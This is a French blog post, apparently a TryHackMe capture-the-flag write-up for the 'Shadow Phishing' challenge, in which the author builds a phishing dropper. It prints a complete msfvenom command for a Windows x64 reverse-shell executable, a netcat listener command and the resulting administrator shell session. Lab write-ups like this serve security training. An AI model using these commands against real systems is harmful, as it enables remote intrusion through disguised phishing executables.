---
title: TryHackMe - Shadow Phishing
date: 2025-03-26 14:32:49 -0400
description: Dans le cadre du Hackfinity Battle sur TryHackMe, le challenge "Shadow Phishing" nous plonge dans un scénario RedTeam où nous devons simuler une attaque de phishing avancée. Un certain "Cipher" (cipher@darknetmail.corp) envoie un email à "ShadowByte" (shadowbyte@darknetmail.corp), demandant la création d’un build du "SilentEdge Installer", un exécutable malveillant qui doit fonctionner proprement sur Windows 10 x64. L’objectif est de générer cet EXE, de confirmer qu’il établit une connexion reverse shell (simulant une porte dérobée installée via une campagne de phishing), et de le soumettre pour un "dead drop". Voici comment j’ai résolu ce défi, étape par étape.
categories: [TryHackMe]
tags: [THM, CTFs, Hacking]
image:
    path: https://i.ibb.co/N2gTrq0p/a.png
---


- **[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.

<h2 style="color: orange;">Analyse</h2>

L’email de **Cipher** précise que nous devons créer un exécutable nommé `SilentEdge Installer` qui fonctionne sur *Windows 10 x64*. Bien que l’email ne mentionne pas explicitement un antivirus, le contexte du challenge **Shadow Phishing** suggère que l’EXE pourrait être utilisé dans une campagne de phishing pour installer une porte dérobée.

Mon objectif était donc de :

- Générer un payload reverse shell avec `msfvenom`.
- Configurer un listener pour recevoir la connexion.
- Soumettre l’exécutable pour valider le challenge via le **dead drop**.




<h2 style="color: orange;">Resolution</h2>
D'abord pour resoudre ce challenge, je vais commencer par un basic `msfvenom` pour creer un payload en `.exe` et voir s'il vas fonctionner ou si l'antivirus vas le flagger

```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe -o hack.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: hack.exe

$ sudo rlwrap nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.6.8.193] from (UNKNOWN) [10.10.254.169] 49899
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
fisher\administrator

C:\Windows\system32>
```

J’ai généré un payload avec `msfvenom` en utilisant le `windows/x64/shell_reverse_tcp`, qui est compatible avec **Windows 10 x64**. J’ai spécifié mon `LHOST` comme `tun0` (mon IP sur le réseau VPN de TryHackMe, ici `10.6.8.193`) et le `LPORT` comme `1337`. Le fichier généré, `hack.exe`, fait `7168` bytes.

Ensuite, j’ai configuré un listener avec `netcat` en utilisant `sudo rlwrap nc -lnvp 1337` pour recevoir la connexion reverse shell. Après avoir exécuté `hack.exe` sur la machine cible (une machine **Windows 10 x64** fournie par le challenge), j’ai reçu une connexion sur mon listener. La commande `whoami` a confirmé que j’avais un shell avec les privilèges de l’utilisateur `fisher\administrator`, ce qui signifie un accès administrateur.





![Hacked](https://i.ibb.co/0yKwv6m6/hacked.png)


<h2 style="color: orange;">Conclusion</h2>

Le challenge **Shadow Phishing** m’a permis de renforcer mes compétences en création de payloads malveillants et en simulation d’attaques de phishing, des techniques clés pour les opérations RedTeam. J’ai particulièrement apprécié le réalisme du scénario, qui met en scène une communication entre deux acteurs malveillants et une tâche concrète de création d’un dropper. Un grand merci à TryHackMe pour ce défi stimulant !


<h2 style="color: orange;">Ressources supplementaires</h2>
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
- **Love my artciles?** Follow me on [Twitter](https://x.com/@bloman19) and [Github](https://github.com/0xabdoulaye)
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
